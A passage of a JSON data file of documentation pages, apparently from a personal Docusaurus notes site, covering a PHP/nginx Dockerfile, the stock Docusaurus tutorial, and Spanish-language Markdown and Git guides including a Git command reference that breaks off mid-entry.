\\\r\n    php71u-mbstring                                                          \\\r\n    php71u-zip                                                               \\\r\n    php71u-gd                                                                \\\r\n     --enablerepo=ius && yum clean all\r\n\r\nEXPOSE 80 443\r\n\r\nVOLUME /var/www/html /var/log/nginx /var/log/php-fpm /var/lib/php-fpm\r\n\r\nCOPY ./conf/nginx.conf /etc/nginx/conf.d/default.conf\r\n\r\nCOPY ./bin/start.sh /start.sh\r\n\r\nCOPY index.php /var/www/html/index.php\r\n\r\nRUN chmod +x /start.sh\r\n\r\nCMD /start.sh\r\n```\r\n\r\n- index.php\r\n\r\n```sh\r\n<?php phpinfo(); ?>\r\n```\r\n",
    "path": "/docker/dockerfiles"
  },
  {
    "id": 16,
    "title": "Tutorial Intro",
    "content": "\r\n# Tutorial Intro\r\n\r\nLet's discover **Docusaurus in less than 5 minutes**.\r\n\r\n## Getting Started\r\n\r\nGet started by **creating a new site**.\r\n\r\nOr **try Docusaurus immediately** with **[docusaurus.new](https://docusaurus.new)**.\r\n\r\n### What you'll need\r\n\r\n- [Node.js](https://nodejs.org/en/download/) version 18.0 or above:\r\n  - When installing Node.js, you are recommended to check all checkboxes related to dependencies.\r\n\r\n## Generate a new site\r\n\r\nGenerate a new Docusaurus site using the **classic template**.\r\n\r\nThe classic template will automatically be added to your project after you run the command:\r\n\r\n```bash\r\nnpm init docusaurus@latest my-website classic\r\n```\r\n\r\nYou can type this command into Command Prompt, Powershell, Terminal, or any other integrated terminal of your code editor.\r\n\r\nThe command also installs all necessary dependencies you need to run Docusaurus.\r\n\r\n## Start your site\r\n\r\nRun the development server:\r\n\r\n```bash\r\ncd my-website\r\nnpm run start\r\n```\r\n\r\nThe `cd` command changes the directory you're working with. In order to work with your newly created Docusaurus site, you'll need to navigate the terminal there.\r\n\r\nThe `npm run start` command builds your website locally and serves it through a development server, ready for you to view at http://localhost:3000/.\r\n\r\nOpen `docs/intro.md` (this page) and edit some lines: the site **reloads automatically** and displays your changes.\r\n",
    "path": "/docs/docusaurus/intro"
  },
  {
    "id": 17,
    "title": "Congratulations!",
    "content": "\r\n# Congratulations!\r\n\r\nYou have just learned the **basics of Docusaurus** and made some changes to the **initial template**.\r\n\r\nDocusaurus has **much more to offer**!\r\n\r\nHave **5 more minutes**? Take a look at **[versioning](../tutorial-extras/manage-docs-versions.md)** and **[i18n](../tutorial-extras/translate-your-site.md)**.\r\n\r\nAnything **unclear** or **buggy** in this tutorial? [Please report it!](https://github.com/facebook/docusaurus/discussions/4610)\r\n\r\n## What's next?\r\n\r\n- Read the [official documentation](https://docusaurus.io/)\r\n- Modify your site configuration with [`docusaurus.config.js`](https://docusaurus.io/docs/api/docusaurus-config)\r\n- Add navbar and footer items with [`themeConfig`](https://docusaurus.io/docs/api/themes/configuration)\r\n- Add a custom [Design and Layout](https://docusaurus.io/docs/styling-layout)\r\n- Add a [search bar](https://docusaurus.io/docs/search)\r\n- Find inspirations in the [Docusaurus showcase](https://docusaurus.io/showcase)\r\n- Get involved in the [Docusaurus Community](https://docusaurus.io/community/support)\r\n",
    "path": "/docs/docusaurus/tutorial-basics/congratulations"
  },
  {
    "id": 18,
    "title": "Create a Blog Post",
    "content": "\r\n# Create a Blog Post\r\n\r\nDocusaurus creates a **page for each blog post**, but also a **blog index page**, a **tag system**, an **RSS** feed...\r\n\r\n## Create your first Post\r\n\r\nCreate a file at `blog/2021-02-28-greetings.md`:\r\n\r\n```md title=\"blog/2021-02-28-greetings.md\"\r\n---\r\nslug: greetings\r\ntitle: Greetings!\r\nauthors:\r\n  - name: Joel Marcey\r\n    title: Co-creator of Docusaurus 1\r\n    url: https://github.com/JoelMarcey\r\n    image_url: https://github.com/JoelMarcey.png\r\n  - name: Sébastien Lorber\r\n    title: Docusaurus maintainer\r\n    url: https://sebastienlorber.com\r\n    image_url: https://github.com/slorber.png\r\ntags: [greetings]\r\n---\r\n\r\nCongratulations, you have made your first post!\r\n\r\nFeel free to play around and edit this post as much as you like.\r\n```\r\n\r\nA new blog post is now available at [http://localhost:3000/blog/greetings](http://localhost:3000/blog/greetings).\r\n",
    "path": "/docs/docusaurus/tutorial-basics/create-a-blog-post"
  },
  {
    "id": 19,
    "title": "Create a Document",
    "content": "\r\n# Create a Document\r\n\r\nDocuments are **groups of pages** connected through:\r\n\r\n- a **sidebar**\r\n- **previous/next navigation**\r\n- **versioning**\r\n\r\n## Create your first Doc\r\n\r\nCreate a Markdown file at `docs/hello.md`:\r\n\r\n```md title=\"docs/hello.md\"\r\n# Hello\r\n\r\nThis is my **first Docusaurus document**!\r\n```\r\n\r\nA new document is now available at [http://localhost:3000/docs/hello](http://localhost:3000/docs/hello).\r\n\r\n## Configure the Sidebar\r\n\r\nDocusaurus automatically **creates a sidebar** from the `docs` folder.\r\n\r\nAdd metadata to customize the sidebar label and position:\r\n\r\n```md title=\"docs/hello.md\" {1-4}\r\n---\r\nsidebar_label: 'Hi!'\r\nsidebar_position: 3\r\n---\r\n\r\n# Hello\r\n\r\nThis is my **first Docusaurus document**!\r\n```\r\n\r\nIt is also possible to create your sidebar explicitly in `sidebars.js`:\r\n\r\n```js title=\"sidebars.js\"\r\nexport default {\r\n  tutorialSidebar: [\r\n    'intro',\r\n    // highlight-next-line\r\n    'hello',\r\n    {\r\n      type: 'category',\r\n      label: 'Tutorial',\r\n      items: ['tutorial-basics/create-a-document'],\r\n    },\r\n  ],\r\n};\r\n```\r\n",
    "path": "/docs/docusaurus/tutorial-basics/create-a-document"
  },
  {
    "id": 20,
    "title": "Create a Page",
    "content": "\r\n# Create a Page\r\n\r\nAdd **Markdown or React** files to `src/pages` to create a **standalone page**:\r\n\r\n- `src/pages/index.js` → `localhost:3000/`\r\n- `src/pages/foo.md` → `localhost:3000/foo`\r\n- `src/pages/foo/bar.js` → `localhost:3000/foo/bar`\r\n\r\n## Create your first React Page\r\n\r\nCreate a file at `src/pages/my-react-page.js`:\r\n\r\n```jsx title=\"src/pages/my-react-page.js\"\r\nimport React from 'react';\r\nimport Layout from '@theme/Layout';\r\n\r\nexport default function MyReactPage() {\r\n  return (\r\n    <Layout>\r\n      <h1>My React page</h1>\r\n      <p>This is a React page</p>\r\n    </Layout>\r\n  );\r\n}\r\n```\r\n\r\nA new page is now available at [http://localhost:3000/my-react-page](http://localhost:3000/my-react-page).\r\n\r\n## Create your first Markdown Page\r\n\r\nCreate a file at `src/pages/my-markdown-page.md`:\r\n\r\n```mdx title=\"src/pages/my-markdown-page.md\"\r\n# My Markdown page\r\n\r\nThis is a Markdown page\r\n```\r\n\r\nA new page is now available at [http://localhost:3000/my-markdown-page](http://localhost:3000/my-markdown-page).\r\n",
    "path": "/docs/docusaurus/tutorial-basics/create-a-page"
  },
  {
    "id": 21,
    "title": "Deploy your site",
    "content": "\r\n# Deploy your site\r\n\r\nDocusaurus is a **static-site-generator** (also called **[Jamstack](https://jamstack.org/)**).\r\n\r\nIt builds your site as simple **static HTML, JavaScript and CSS files**.\r\n\r\n## Build your site\r\n\r\nBuild your site **for production**:\r\n\r\n```bash\r\nnpm run build\r\n```\r\n\r\nThe static files are generated in the `build` folder.\r\n\r\n## Deploy your site\r\n\r\nTest your production build locally:\r\n\r\n```bash\r\nnpm run serve\r\n```\r\n\r\nThe `build` folder is now served at [http://localhost:3000/](http://localhost:3000/).\r\n\r\nYou can now deploy the `build` folder **almost anywhere** easily, **for free** or very small cost (read the **[Deployment Guide](https://docusaurus.io/docs/deployment)**).\r\n",
    "path": "/docs/docusaurus/tutorial-basics/deploy-your-site"
  },
  {
    "id": 22,
    "title": "Markdown Features",
    "content": "\r\n# Markdown Features\r\n\r\nDocusaurus supports **[Markdown](https://daringfireball.net/projects/markdown/syntax)** and a few **additional features**.\r\n\r\n## Front Matter\r\n\r\nMarkdown documents have metadata at the top called [Front Matter](https://jekyllrb.com/docs/front-matter/):\r\n\r\n```text title=\"my-doc.md\"\r\n// highlight-start\r\n---\r\nid: my-doc-id\r\ntitle: My document title\r\ndescription: My document description\r\nslug: /my-custom-url\r\n---\r\n// highlight-end\r\n\r\n## Markdown heading\r\n\r\nMarkdown text with [links](./hello.md)\r\n```\r\n\r\n## Links\r\n\r\nRegular Markdown links are supported, using url paths or relative file paths.\r\n\r\n```md\r\nLet's see how to [Create a page](/create-a-page).\r\n```\r\n\r\n```md\r\nLet's see how to [Create a page](./create-a-page.md).\r\n```\r\n\r\n**Result:** Let's see how to [Create a page](./create-a-page.md).\r\n\r\n## Images\r\n\r\nRegular Markdown images are supported.\r\n\r\nYou can use absolute paths to reference images in the static directory :\r\n\r\n\r\n\r\n\r\nYou can reference images relative to the current file as well. This is particularly useful to colocate images close to the Markdown files using them:\r\n\r\n\r\n\r\n## Code Blocks\r\n\r\nMarkdown code blocks are supported with Syntax highlighting.\r\n\r\n````md\r\n```jsx title=\"src/components/HelloDocusaurus.js\"\r\nfunction HelloDocusaurus() {\r\n  return <h1>Hello, Docusaurus!</h1>;\r\n}\r\n```\r\n````\r\n\r\n```jsx title=\"src/components/HelloDocusaurus.js\"\r\nfunction HelloDocusaurus() {\r\n  return <h1>Hello, Docusaurus!</h1>;\r\n}\r\n```\r\n\r\n## Admonitions\r\n\r\nDocusaurus has a special syntax to create admonitions and callouts:\r\n\r\n```md\r\n:::tip My tip\r\n\r\nUse this awesome feature option\r\n\r\n:::\r\n\r\n:::danger Take care\r\n\r\nThis action is dangerous\r\n\r\n:::\r\n```\r\n\r\n:::tip My tip\r\n\r\nUse this awesome feature option\r\n\r\n:::\r\n\r\n:::danger Take care\r\n\r\nThis action is dangerous\r\n\r\n:::\r\n\r\n## MDX and React Components\r\n\r\n[MDX](https://mdxjs.com/) can make your documentation more **interactive** and allows using any **React components inside Markdown**:\r\n\r\n```jsx\r\nexport const Highlight = ({children, color}) => (\r\n  <span\r\n    style={{\r\n      backgroundColor: color,\r\n      borderRadius: '20px',\r\n      color: '#fff',\r\n      padding: '10px',\r\n      cursor: 'pointer',\r\n    }}\r\n    onClick={() => {\r\n      alert(`You clicked the color ${color} with label ${children}`)\r\n    }}>\r\n    {children}\r\n  </span>\r\n);\r\n\r\nThis is <Highlight color=\"#25c2a0\">Docusaurus green</Highlight> !\r\n\r\nThis is <Highlight color=\"#1877F2\">Facebook blue</Highlight> !\r\n```\r\n\r\nexport const Highlight = ({children, color}) => (\r\n  <span\r\n    style={{\r\n      backgroundColor: color,\r\n      borderRadius: '20px',\r\n      color: '#fff',\r\n      padding: '10px',\r\n      cursor: 'pointer',\r\n    }}\r\n    onClick={() => {\r\n      alert(`You clicked the color ${color} with label ${children}`);\r\n    }}>\r\n    {children}\r\n  </span>\r\n);\r\n\r\nThis is <Highlight color=\"#25c2a0\">Docusaurus green</Highlight> !\r\n\r\nThis is <Highlight color=\"#1877F2\">Facebook blue</Highlight> !\r\n",
    "path": "/docs/docusaurus/tutorial-basics/markdown-features"
  },
  {
    "id": 23,
    "title": "Manage Docs Versions",
    "content": "\r\n# Manage Docs Versions\r\n\r\nDocusaurus can manage multiple versions of your docs.\r\n\r\n## Create a docs version\r\n\r\nRelease a version 1.0 of your project:\r\n\r\n```bash\r\nnpm run docusaurus docs:version 1.0\r\n```\r\n\r\nThe `docs` folder is copied into `versioned_docs/version-1.0` and `versions.json` is created.\r\n\r\nYour docs now have 2 versions:\r\n\r\n- `1.0` at `http://localhost:3000/docs/` for the version 1.0 docs\r\n- `current` at `http://localhost:3000/docs/next/` for the **upcoming, unreleased docs**\r\n\r\n## Add a Version Dropdown\r\n\r\nTo navigate seamlessly across versions, add a version dropdown.\r\n\r\nModify the `docusaurus.config.js` file:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  themeConfig: {\r\n    navbar: {\r\n      items: [\r\n        // highlight-start\r\n        {\r\n          type: 'docsVersionDropdown',\r\n        },\r\n        // highlight-end\r\n      ],\r\n    },\r\n  },\r\n};\r\n```\r\n\r\nThe docs version dropdown appears in your navbar:\r\n\r\n![Docs Version Dropdown](./img/docsVersionDropdown.png)\r\n\r\n## Update an existing version\r\n\r\nIt is possible to edit versioned docs in their respective folder:\r\n\r\n- `versioned_docs/version-1.0/hello.md` updates `http://localhost:3000/docs/hello`\r\n- `docs/hello.md` updates `http://localhost:3000/docs/next/hello`\r\n",
    "path": "/docs/docusaurus/tutorial-extras/manage-docs-versions"
  },
  {
    "id": 24,
    "title": "Translate your site",
    "content": "\r\n# Translate your site\r\n\r\nLet's translate `docs/intro.md` to French.\r\n\r\n## Configure i18n\r\n\r\nModify `docusaurus.config.js` to add support for the `fr` locale:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  i18n: {\r\n    defaultLocale: 'en',\r\n    locales: ['en', 'fr'],\r\n  },\r\n};\r\n```\r\n\r\n## Translate a doc\r\n\r\nCopy the `docs/intro.md` file to the `i18n/fr` folder:\r\n\r\n```bash\r\nmkdir -p i18n/fr/docusaurus-plugin-content-docs/current/\r\n\r\ncp docs/intro.md i18n/fr/docusaurus-plugin-content-docs/current/intro.md\r\n```\r\n\r\nTranslate `i18n/fr/docusaurus-plugin-content-docs/current/intro.md` in French.\r\n\r\n## Start your localized site\r\n\r\nStart your site on the French locale:\r\n\r\n```bash\r\nnpm run start -- --locale fr\r\n```\r\n\r\nYour localized site is accessible at [http://localhost:3000/fr/](http://localhost:3000/fr/) and the `Getting Started` page is translated.\r\n\r\n:::caution\r\n\r\nIn development, you can only use one locale at a time.\r\n\r\n:::\r\n\r\n## Add a Locale Dropdown\r\n\r\nTo navigate seamlessly across languages, add a locale dropdown.\r\n\r\nModify the `docusaurus.config.js` file:\r\n\r\n```js title=\"docusaurus.config.js\"\r\nexport default {\r\n  themeConfig: {\r\n    navbar: {\r\n      items: [\r\n        // highlight-start\r\n        {\r\n          type: 'localeDropdown',\r\n        },\r\n        // highlight-end\r\n      ],\r\n    },\r\n  },\r\n};\r\n```\r\n\r\nThe locale dropdown now appears in your navbar:\r\n\r\n![Locale Dropdown](./img/localeDropdown.png)\r\n\r\n## Build your localized site\r\n\r\nBuild your site for a specific locale:\r\n\r\n```bash\r\nnpm run build -- --locale fr\r\n```\r\n\r\nOr build your site to include all the locales at once:\r\n\r\n```bash\r\nnpm run build\r\n```\r\n",
    "path": "/docs/docusaurus/tutorial-extras/translate-your-site"
  },
  {
    "id": 25,
    "title": "Markdown",
    "content": "\r\n# Markdown\r\n\r\n## Referencias\r\n\r\n- Fuente de información: [Enlace](https://www.ionos.es/digitalguide/paginas-web/desarrollo-web/tutorial-de-markdown/)\r\n- Tutorial Markdown de GitHub: [Enlace](http://www.markdowntutorial.com/)\r\n- GitHub Markdown Sheet: [Enlace](https://guides.github.com/pdfs/markdown-cheatsheet-online.pdf)\r\n- Emojis de GitHub: [Enlace](https://www.webpagefx.com/tools/emoji-cheat-sheet/)\r\n- IMPORTANTE: [Enlace](https://markdown.es/sintaxis-markdown/)\r\n\r\n## Negrita y cursiva\r\n\r\n```md\r\n_Texto en cursiva_\r\n```\r\n\r\n_Texto en cursiva_\r\n\r\n```md\r\n**Texto en negrita**\r\n```\r\n\r\n**Texto en negrita**\r\n\r\n```md\r\n**_Texto en cursiva y negrita_**\r\n```\r\n\r\n**_Texto en cursiva y negrita_**\r\n\r\n## Tachado\r\n\r\n```md\r\n~~Este texto está tachado.~~ Pero este no.\r\n```\r\n\r\n~~Este texto está tachado.~~ Pero este no.\r\n\r\n## Subrayado\r\n\r\n```md\r\n---\r\n```\r\n\r\n---\r\n\r\n## Títulos y subtítulos\r\n\r\n```d\r\n# Título 1\r\n## Título 2\r\n### Título 3\r\n#### Título 4\r\n##### Título 5\r\n###### Título 6\r\n```\r\n\r\n## Párrafos\r\n\r\nLínea en blanco completamente\r\n\r\n## Comillas y sangrado\r\n\r\n```md\r\n> Este es un **fragmento con comillas**.\r\n> El fragmento continúa aquí.\r\n\r\n> Este es otro **fragmento con comillas**.\r\n> Este fragmento continúa en la siguiente línea.\r\n\r\nEsta línea ya no está sangrada.\r\n```\r\n\r\n> Este es un **fragmento con comillas**.\r\n> El fragmento continúa aquí.\r\n\r\n> Este es otro **fragmento con comillas**.\r\n> Este fragmento continúa en la siguiente línea.\r\n\r\nEsta línea ya no está sangrada.\r\n\r\n## Listas\r\n\r\n> - **No ordenada**\r\n\r\n```md\r\n- Elemento de la lista 1\r\n- Elemento de la lista 2\r\n- Elemento de la lista 3\r\n```\r\n\r\n- Elemento de la lista 1\r\n- Elemento de la lista 2\r\n- Elemento de la lista 3\r\n\r\n> - **Ordenada**\r\n\r\n```md\r\n1. Elemento de la lista 1\r\n2. Elemento de la lista 2\r\n3. Elemento de la lista 3\r\n```\r\n\r\n1. Elemento de la lista 1\r\n2. Elemento de la lista 2\r\n3. Elemento de la lista 3\r\n\r\n## Casillas de verificación\r\n\r\n```md\r\n- [ ] A\r\n- [x] B\r\n- [ ] C\r\n```\r\n\r\n- [ ] A\r\n- [x] B\r\n- [ ] C\r\n\r\n## Código\r\n\r\n> - **Código**\r\n\r\n```md\r\nEsto es `código`.\r\n```\r\n\r\nEsto es `código`.\r\n\r\n> - **Código línea**\r\n\r\n```\r\n``Todo esto es `código`.``\r\n```\r\n\r\n`` Todo esto es `código`. ``\r\n\r\n> - **bloque**\r\n\r\n````md\r\n```html\r\n<html>\r\n  <head> </head>\r\n</html>\r\n```\r\n````\r\n\r\n```html\r\n<html>\r\n  <head> </head>\r\n</html>\r\n```\r\n\r\n## Hipervínculos\r\n\r\n```md\r\nA continuación se muestra un [Enlace](https://ejemplo.com/ \"Título opcional del enlace\")\r\n```\r\n\r\nA continuación se muestra un [Enlace](https://ejemplo.com/ \"Título opcional del enlace\")\r\n\r\n## Imágenes\r\n\r\n```md\r\n![Esta es una imagen de ejemplo](./static/markdown.png)\r\n```\r\n\r\n![Esta es una imagen de ejemplo](./static/markdown.png)\r\n\r\n> - **Imagen + Hipervínculo**\r\n\r\n```md\r\n[![Esta es una imagen de ejemplo](./static/markdown.png)](https://ejemplo.com)\r\n```\r\n\r\n[![Esta es una imagen de ejemplo](./static/markdown.png)](https://ejemplo.com)\r\n\r\n## Tablas\r\n\r\n```md\r\n| Columna 1 | Columna 2 |\r\n| --------- | --------- |\r\n| A         | B         |\r\n| C         | D         |\r\n```\r\n\r\n| Columna 1 | Columna 2 |\r\n| --------- | --------- |\r\n| A         | B         |\r\n| C         | D         |\r\n\r\n## Notas al pie de página\r\n\r\nPuedes colocar [^1] notas en el pie de página [^2] fácilmente.\r\n\r\n[^1]: Aquí encuentras el texto de la nota al pie de página.\r\n[^2]: **Las notas de pie de página** pueden _formatearse_ también.\r\n\r\nEstas pueden ocupar varias líneas.\r\n\r\n## & y \\<\\>\r\n\r\nA & B\r\n&alpha;\r\n1 < 2\r\n&gt;\r\n&lt;\r\n\r\n## Escape\r\n\r\nAsterisco: \\*\r\n\r\nGuion: -\r\n\r\nGuion bajo: \\_\r\n\r\nParéntesis: ()\r\n\r\nCorchetes: []\r\n\r\nLlaves: {}\r\n\r\nPunto: .\r\n\r\nSigno de exclamación: !\r\n\r\nAlmohadilla: #\r\n\r\nAcento grave: `\r\n\r\nBarra invertida: \\\r\n\r\nEsto es un \\*ejemplo con asteriscos\\*.\r\n\r\n## Emojis\r\n\r\nReferencia: [www.emoji-cheat-sheet.com](https://www.webfx.com/tools/emoji-cheat-sheet)\r\n\r\n```md\r\n:+1: :sparkles: :camel: :tada: :rocket: :metal: :octocat:\r\n```\r\n\r\n:+1: :sparkles: :camel: :tada: :rocket:\r\n\r\n## Github issues | pull-request\r\n\r\nCualquier número que referencie un issue o pull-request será convertido en un enlace\r\n\r\n```md\r\n#1\r\ngithub-flavored-markdown#1\r\ndefunkt/github-flavored-markdown#1\r\n```\r\n\r\n## Github mención a usuarios\r\n\r\n```md\r\n@usuario\r\n```\r\n",
    "path": "/docs/markdown/markdown"
  },
  {
    "id": 26,
    "title": "consejos",
    "content": "\r\n1. **NUNCA hacer commit directamente a ‘master’**\r\n   Al trabajar directamente con la rama master estamos perdiendo una de las características más destacables del trabajo con Git, la capacidad de crear ramas instantáneamente.\r\n   Buena practica: crear una nueva rama para cosa nueva en la que trabajar, de esta manera master (o develop) siempre estará lista para cambios menores, rápidos o hotfixes.\r\n\r\n2. **NUNCA hacer git push –force**\r\n   Esto sobreescribe toda la estructura y secuencia de commits en el repositorio central, tirando a la basura los commits de las demás personas.\r\n   Para evitar que alguien haga un push –force. De ser un servicio estándar utilizar:\r\n   Git config –system receive.denyNonFastForwards true\r\n\r\n3. **NUNCA subir archivos binarios**\r\n   Los archivos como imágenes, binarios compilados o incluso videos son mucho más grandes que los archivos de texto de nuestro código y si hacemos commits de ellos a nuestro repositorio central el tamaño de este se volverá muy grande y lo que se busca es tener un VCS distribuido rápido de clonar y navegar entre ramas.\r\n\r\n4. **NUNCA usar git pull**\r\n   Haciendo git pull no tenemos oportunidad de ver que clase de cambios estamos tratando de incorporar.\r\n   La recomendación es usar git fetch periódicamente para actualizar solo la referencia a las ramas remotas, y darle una inspección rápida y decidir qué hacer.\r\n   Para mantener el repositorio limpio, nuestros commits locales deben estar encima de los cambios de los demás, y para esto en lugar de git pull deberemos usar git pull –rebase. Así los conflictos serán resueltos commit por commit y no todo en uno.\r\n   No es bueno hacer un rebase de un repositorio remoto, pero en local es bueno para mantener la historia local limpio.\r\n   Lo recomendable es crear una nueva rama para agregar nueva funcionalidad a la aplicación. En local haces un rebase para ver un historial limpio y en remoto se hace un merge commit para implementar esta funcionalidad en la rama principal.\r\n\r\n5. **NUNCA Usar Fast Forward**\r\n   Con git merge no aseguramos un merge commit, estos solo son necesarios cuando ambas ramas a mezclar tienen nuevos commits.\r\n   Sin un merge commit no podemos saber que commits representan una característica sobre la que se ha trabajado sin inspeccionar uno por uno los commits y sus mensajes.\r\n\r\n   - Sin la opción de fast forward. Se respeta el historial de commits de la rama fusionada\r\n\r\n   - Usando fast-forward. El historial se mezcla con la rama actual y no es posible diferenciar de donde provienen los commits\r\n\r\n   >Recomendable usar \"merge –no-ff\"\r\n\r\n   Importante: Aún así, con o sin FF el código no ser verá afectado.\r\n",
    "path": "/git/consejos"
  },
  {
    "id": 27,
    "title": "enlaces",
    "content": "\r\n- Guía oficial de Gitosis\r\n  [https://git-scm.com/book/es/v1/Git-en-un-servidor-Gitosis](https://git-scm.com/book/es/v1/Git-en-un-servidor-Gitosis)\r\n\r\n- Guardar su contraseña de GitHub en WINDOWS\r\n  [https://help.github.com/articles/caching-your-github-password-in-git/#platform-windows](https://help.github.com/articles/caching-your-github-password-in-git/#platform-windows)\r\n\r\n- Guardar su usuario y contraseña en LINUX\r\n  https://help.github.com/articles/caching-your-github-password-in-git/#platform-linux\r\n\r\n- Manejo de ramas\r\n  [https://www.genbeta.com/desarrollo/manejo-de-ramas-de-desarrollo-con-git](https://www.genbeta.com/desarrollo/manejo-de-ramas-de-desarrollo-con-git)\r\n",
    "path": "/git/enlaces"
  },
  {
    "id": 28,
    "title": "merge_vs_rebase",
    "content": "\r\n## Diferencia\r\n\r\n> **Cuando haces git rebase:**\r\n\r\n- los commits locales se eliminan de la rama temporalmente.\r\n- se ejecuta un git pull.\r\n- los commits locales se insertan nuevamente.\r\n\r\nEsto quiere decir que todos tus commits locales aparecen al final, después de los commits remotos. Esto es, si haces git log, los commits de la rama que has rebasado aparecen como si fueran más antiguos, independientemente de cuándo se hicieran.\r\n\r\n> **Cuando haces git merge**\r\n\r\n- Une dos o más historiales de desarrollo, es decir, cuando haces un merge de una rama en la tuya juntas el historial de ámbas.\r\n\r\nDespués de hacer esto una y otra vez tendras un historial intercalado entre los cambios realizados por varias personas.\r\n\r\n## Explicación paso a paso\r\n\r\n1. Supongamos que tienes 3 commits A, B, C:\r\n\r\n   ![1](./static/merge_vs_rebase/1.jpg)\r\n\r\n2. Entonces viene Daniel y crea un commit D. Luego Enrique crea un commit E\r\n\r\n   ![2](./static/merge_vs_rebase/2.jpg)\r\n\r\n3. Obviamente, este conflicto debe ser resuelto de alguna forma. Para ello hay dos maneras\r\n\r\n   - **MERGE**\r\n     Ambos commits D y E aún están allí, pero creamos un commit de unión (merge commit) M que hereda los cambios de ambos commits D y E. Sin embargo, esto crea la estructura en forma de diamante, que a mucha gente confunde.\r\n\r\n     ![3](./static/merge_vs_rebase/3.jpg)\r\n\r\n   - **REBASE**\r\n     Creamos un commit R, cuyo contenido es idéntico al del commit M descrito arriba. Sin embargo, nos cargamos el commit E como si nunca hubiera existido (se ve con los puntitos, en la línea evanescente). De acuerdo con esta anulación, E debería ser un commit local de Enrique y no debería haber hecho push a ningún repositorio. La ventaja de este método es que se evita la forma de diamante y el historial permanece lineal, que es algo que la mayoría de los desarrolladores agradecen\r\n\r\n     ![4](./static/merge_vs_rebase/4.jpg)\r\n\r\n## En conclusión\r\n\r\nCon git rebase tendrás un historial más claro, por lo que suele ser la opción preferida.\r\n",
    "path": "/git/merge_vs_rebase"
  },
  {
    "id": 29,
    "title": "referencia",
    "content": "\r\n## DASH Y DOBLE DASH (- / --)\r\n\r\n```sh\r\n- Una sola letra\r\n-- Una palabra\r\n```\r\n\r\n## BUENAS PRÁCTICAS\r\n\r\n- **Realizar un fetch o pull antes de un push al repositorio**\r\n\r\n## CONFIGURACIÓN\r\n\r\n- **Configurar el usuario**\r\n\r\n  `git config --global user.name \"RubenFGR\"`\r\n\r\n  `git config --global user.email \"rubenfgr87@outlook.com\"`\r\n\r\n- **Editar estos parámetros desde el archivo**\r\n\r\n  `git config --global -e`\r\n\r\n- **Listar la configuración**\r\n\r\n  `git config -l`\r\n\r\n## AUTO-IDENTIFICACIÓN\r\n\r\n- **Evitar que git solicite el usuario y contraseña cada vez**\r\n\r\n  `git config --global credential.helper store`\r\n\r\n- **Lo mismo que el anterior mantendiendolo en memoria un tiempo limitado por seguridad**\r\n\r\n  `git config --global credential.helper 'cache --timeout=3600'`\r\n\r\n- **Eliminar esta configuración**\r\n\r\n  `sudo rm ~/.git-credentials`\r\n\r\n## STATUS Y LOG\r\n\r\n- **Ver todo el historial de la línea de tiempo**\r\n\r\n  `git reflog`\r\n\r\n- **Ver los últimos cambios después del último commit**\r\n\r\n  `git diff`\r\n\r\n- **Ver los cambios en el escenario**\r\n\r\n  `git diff --staged`\r\n\r\n- **Ver diferencias entre dos ramas**\r\n\r\n  `git diff \"rama-uno\" \"rama-dos\"`\r\n\r\n- **Ver el estado actual del repositorio**\r\n\r\n  `git status`\r\n\r\n- **ver el estado actual del repositorio en formato corto**\r\n\r\n  `git status -s`\r\n\r\n- **ver el estado actual del repositorio en formato corto y ramas**\r\n\r\n  `git status -s -b`\r\n\r\n- **Ver todos los cambios del repositorio (commits)**\r\n\r\n  `git log`\r\n\r\n- **Ver los commits realizados a una línea (hash corto y mensaje)**\r\n\r\n  `git log --oneline`\r\n\r\n- **Ver los commits realizados de forma gráfica a una línea y decorados**\r\n\r\n  `git log --graph --oneline --decorate --all`\r\n\r\n## MODIFICACIÓN Y ELIMINACIÓN\r\n\r\n- **Modificar el nombre de algún archivo**\r\n\r\n  `git mv \"nombreArchivoAntiguo\" \"nombreArchivoNuevo\"`\r\n\r\n- **Eliminar un archivo**\r\n\r\n  `git rm \"nombreArchivo\"`\r\n\r\n## IGNORAR ARCHIVOS Y DIRECTORIOS\r\n\r\n1. Crear el fichero .gitignore en el raíz\r\n2. Ignorar directorio `.directorio/`\r\n3. Ignorar fichero `.fichero.txt`\r\n4. Ignorar varios por extension `*.txt`\r\n\r\n\" Ignorar directorios o ficheros que ya estaban rastreados por git\r\n\r\n1. Agregar los ficheros o directorios al .gitignore\r\n2. Limpiar toda la cache de rastreo `git rm -r --cached .`\r\n3. Limpiar un fichero o directorio concreto de la cache de rastreo `git rm --cached .fichero.txt`\r\n4. Agregar los cambios al escenario `git add .`\r\n5. Subir los cambios `git push origin \"rama\"`\r\n\r\n## STAGGING\r\n\r\n- **Agrega todos los archivos modificados al escenario**\r\n\r\n  `git add . `\r\n\r\n  `git add --all`\r\n\r\n  `git add -- .`\r\n\r\n- **Agregar los archivos dentro de la carpeta al escenario**\r\n\r\n  `git add carpeta/`\r\n\r\n- **Agregar todos los archivos del directorio actual .png**\r\n\r\n  `git add *.png`\r\n\r\n  `git add carpeta/*.pdf`\r\n\r\n- **Agrega todo jerarquicamente al escenario**\r\n\r\n  `git add -A`\r\n\r\n- **Agregar todos los archivo .txt del proyecto al escenario**\r\n\r\n  `git add \"*.txt\"`\r\n\r\n- **Agregar la lista de archivo al escenario**\r\n\r\n  `git add \"lista de archivos\"`\r\n\r\n- **Agregar todo con actualización (-u (update))**\r\n\r\n  `git add -u`\r\n\r\n- **Eliminar del escenario**\r\n\r\n  `git reset \"nombreFichero | nombreCarpeta\"`\r\n\r\n  `git reset HEAD \"nombreFichero\"`\r\n\r\n## COMMIT\r\n\r\n- **Los commits se pueden referenciar en GitHub a través de su Hash**\r\n  - HEAD apunta al último commit realizado\r\n  - HEAD^ apunta al penúltimo commit realizado\r\n- **Agregar archivos al escenario y realizar el commit**\r\n\r\n  `git commit -am \"mensaje\"`\r\n\r\n- **Modificar el último commit y cambiar el mensaje**\r\n\r\n  `git commit --amend -m \"nuevo mensaje\"`\r\n\r\n- **Deshacer un commit sin borrar los archivos (sólo último commit), reset tiene 3 niveles de borrado, el siguiente es el más debil**\r\n\r\n  `git reset --soft HEAD~1`\r\n\r\n- **Moverse a un punto de la historia (commit) con su hash guardando los cambios superiores**\r\n\r\n  `git reset --mixed \"hash\"`\r\n\r\n- **Moverse a un commit con eliminando todo lo superior a el**\r\n\r\n  `git reset --hard \"hash\"`\r\n\r\n- **Vuelve el estado del repositorio al último commit**\r\n\r\n  `git checkout -- .`\r\n\r\n- **Vuelve un archivo al estado que tenia en el último commit**\r\n\r\n  `git checkout -- 